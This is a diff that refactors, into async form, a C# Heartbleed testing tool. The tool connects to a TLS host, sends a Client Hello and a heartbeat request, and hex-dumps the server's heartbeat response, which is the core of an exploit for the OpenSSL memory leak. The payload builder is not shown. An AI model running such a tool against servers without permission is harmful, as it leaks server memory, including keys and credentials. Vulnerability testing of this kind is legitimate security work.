@@ -65,117 +65,138 @@ namespace HeartBleed.Net
         }
 
         private const int SSL3_RT_HEADER_LENGTH = 5;
-        private bool ReceiveHeader(Socket socket, ref byte type, ref ushort version, ref ushort length)
+
+        public class ReceiveHeaderResult
         {
-            byte[] buffer = new byte[SSL3_RT_HEADER_LENGTH];
-            length = SSL3_RT_HEADER_LENGTH;
-
-            try
-            {
-                int receive = socket.Receive(buffer, SSL3_RT_HEADER_LENGTH, SocketFlags.None);
-                if (receive != SSL3_RT_HEADER_LENGTH)
-                {
-                    Log.Error("Invalid HEADER size");
-                    return false;
-                }
-            }
-            catch (System.Net.Sockets.SocketException)
-            {
-                Log.Error("Socket Exception");
-                return false;
-            }
-
-            type = buffer[0];
-            version = (ushort)((buffer[1] << 8) | buffer[2]);
-            length = (ushort)((buffer[3] << 8) | buffer[4]);
-
-            return true;
+            public bool Success { get; set; }
+            public byte Type { get; set; }
+            public ushort Version { get; set; }
+            public ushort Length { get; set; }
         }
 
-        private bool ReceiveData(Socket socket, ref ushort length, ref byte[] buffer)
+        private static async Task<ReceiveHeaderResult> ReceiveHeader(Socket socket)
         {
-            buffer = new byte[length];
+            ReceiveHeaderResult result = new ReceiveHeaderResult { Success = true };
             
+            byte[] buffer = new byte[SSL3_RT_HEADER_LENGTH];
+
+            await Task.Run(() =>
+            {
+                try
+                {
+                    int receive = socket.Receive(buffer, SSL3_RT_HEADER_LENGTH, SocketFlags.None);
+                    
+                    if (receive != SSL3_RT_HEADER_LENGTH)
+                    {
+                        Log.Error("Invalid HEADER size");
+                        result.Success = false;
+                    }
+                }
+                catch (System.Net.Sockets.SocketException)
+                {
+                    Log.Error("Socket Exception");
+                    result.Success = false;
+                }
+            });
+
+            result.Type = buffer[0];
+            result.Version = (ushort)((buffer[1] << 8) | buffer[2]);
+            result.Length = (ushort)((buffer[3] << 8) | buffer[4]);
+
+            return result;
+        }
+
+        public class ReceiveDataResult
+        {
+            public bool Success { get; set; }
+            public ushort Length { get; set; }
+            public byte[] Buffer { get; set; }
+        }
+
+        private static async Task<ReceiveDataResult> ReceiveData(Socket socket, ushort length)
+        {
+            byte[] buffer = new byte[length];
+
+            bool success = true;
             int offset = 0;
             int remaining = length;
             int readCount = 0;
 
             socket.ReceiveTimeout = 5000;
 
-            while (offset < length)
+            await Task.Run(() =>
             {
-                int receive = socket.Receive(buffer, offset, remaining, SocketFlags.None);
-                
-                offset += receive;
-                remaining -= receive;
-
-                if (readCount++ == 10)
+                while (offset < length)
                 {
-                    Log.Information("Too many consecutive reads");
-                    return false;
-                }
-            }
+                    int receive = socket.Receive(buffer, offset, remaining, SocketFlags.None);
 
-            return true;
+                    offset += receive;
+                    remaining -= receive;
+
+                    if (readCount++ == 10)
+                    {
+                        Log.Information("Too many consecutive reads");
+                        success = false;
+                    }
+                }
+            });
+
+            return new ReceiveDataResult { Success = success, Length = length, Buffer = buffer};
         }
 
-        public bool TestHost(string host, int port = 443)
+        public async Task<bool> TestHost(string host, int port = 443, SSLVersion sslVersion = SSLVersion.TLS1_2_VERSION)
         {
-            SSLVersion requestedVersion = SSLVersion.TLS1_2_VERSION;
-
             using (Socket socket = new Socket(SocketType.Stream, ProtocolType.IP))
             {
-                Log.Information("Trying " + requestedVersion + "...");
+                Log.Information("Trying " + sslVersion + "...");
                 Log.Information("Connecting...");
 
                 socket.Connect(host, port);
 
                 Log.Information("Sending Client Hello...");
-                byte[] hello = GetHello(requestedVersion);
-                if (socket.Send(hello) != hello.Length)
+                await Task.Run(() =>
                 {
-                    Log.Error("Error while sending HELLO");
-                }
+                    byte[] hello = GetHello(sslVersion);
+                    if (socket.Send(hello) != hello.Length)
+                    {
+                        Log.Error("Error while sending HELLO");
+                    }
+                });
 
-                byte[] buffer = null;
-                byte type = 0;
-                ushort version = 0;
-                ushort length = 0;
                 bool done = false;
 
                 Log.Information("Waiting for Server Hello...");
                 while (!done)
                 {
-                    if (!ReceiveHeader(socket, ref type, ref version, ref length))
+                    ReceiveHeaderResult receiveHeader = await ReceiveHeader(socket);
+                    if (!receiveHeader.Success)
                     {
                         Log.Error("Error while receiving header");
                         return false;
                     }
 
-                    Log.Information("\tReceive Header {Type} {Version} {Length}", (SSLHeaderType)type, (SSLVersion)version, length);
+                    Log.Information("Receive Header {Type} {Version} {Length}", (SSLHeaderType)receiveHeader.Type, (SSLVersion)receiveHeader.Version, receiveHeader.Length);
 
-                    if (!ReceiveData(socket, ref length, ref buffer))
+                    ReceiveDataResult receiveData = await ReceiveData(socket, receiveHeader.Length);
+                    if (!receiveData.Success)
                     {
                         Log.Error("Error while receiving data");
                         return false;
                     }
 
-                    if ((SSLHeaderType)type == SSLHeaderType.SSL3_RT_HANDSHAKE)
+                    if ((SSLHeaderType)receiveHeader.Type == SSLHeaderType.SSL3_RT_HANDSHAKE)
                     {
                         int offset = 0;
                         // This code will handle situations against IIS etc with multiple handshakes
-                        while (!done && offset < length)
+                        while (!done && offset < receiveHeader.Length)
                         {
-                            SSLHandshakeType handshake = (SSLHandshakeType)buffer[offset];
-
+                            SSLHandshakeType handshake = (SSLHandshakeType)receiveData.Buffer[offset];
                             if (handshake == SSLHandshakeType.SSL3_MT_SERVER_DONE)
-                            {
                                 done = true;
-                            }
 
-                            int handshakeLength = ((buffer[offset + 1] << 16) | (buffer[offset + 2] << 8) | buffer[offset + 3]);
+                            int handshakeLength = ((receiveData.Buffer[offset + 1] << 16) | (receiveData.Buffer[offset + 2] << 8) | receiveData.Buffer[offset + 3]);
 
-                            Log.Information("\tReceive Data {Type} {Length}", (SSLHandshakeType)handshake, handshakeLength);
+                            Log.Information("Receive Data {Type} {Length}", (SSLHandshakeType)handshake, handshakeLength);
 
                             offset += 4; // skip header
                             offset += handshakeLength;
@@ -183,7 +204,7 @@ namespace HeartBleed.Net
                     }
                 }
 
-                byte[] heartbeat = GetHeartBeat(requestedVersion);
+                byte[] heartbeat = GetHeartBeat(sslVersion);
 
                 Log.Information("Sending heartbeat request...");
                 if (socket.Send(heartbeat) != heartbeat.Length)
@@ -193,19 +214,21 @@ namespace HeartBleed.Net
                 }
 
                 Log.Information("Waiting for heartbeat response...");
-                if (!ReceiveHeader(socket, ref type, ref version, ref length))
+                ReceiveHeaderResult receiveHeartBeatHeader = await ReceiveHeader(socket);
+                if (!receiveHeartBeatHeader.Success)
                 {
                     Log.Error("Error while heartbeat response header");
                     return false;
                 }
 
-                if (type != (byte)SSLHeaderType.SSL3_RT_HEARTBEAT)
+                if (receiveHeartBeatHeader.Type != (byte)SSLHeaderType.SSL3_RT_HEARTBEAT)
                 {
-                    Log.Error("Invalid HEARTBEAT response");
+                    Log.Error("Invalid HEARTBEAT response.  Got {Response} ({Type})", receiveHeartBeatHeader.Type, (SSLHeaderType)receiveHeartBeatHeader.Type);
                     return false;
                 }
 
-                if (!ReceiveData(socket, ref length, ref buffer))
+                ReceiveDataResult receiveHeartBeatData = await ReceiveData(socket, receiveHeartBeatHeader.Length);
+                if (!receiveHeartBeatData.Success)
                 {
                     Log.Error("Error while receiving data");
                     return false;
@@ -213,7 +236,7 @@ namespace HeartBleed.Net
 
                 socket.Close();
 
-                Log.Information("{HexDump}", Utility.HexDump(buffer));
+                Log.Information("{HexDump}", Utility.HexDump(receiveHeartBeatData.Buffer));
 
                 return true;
             }
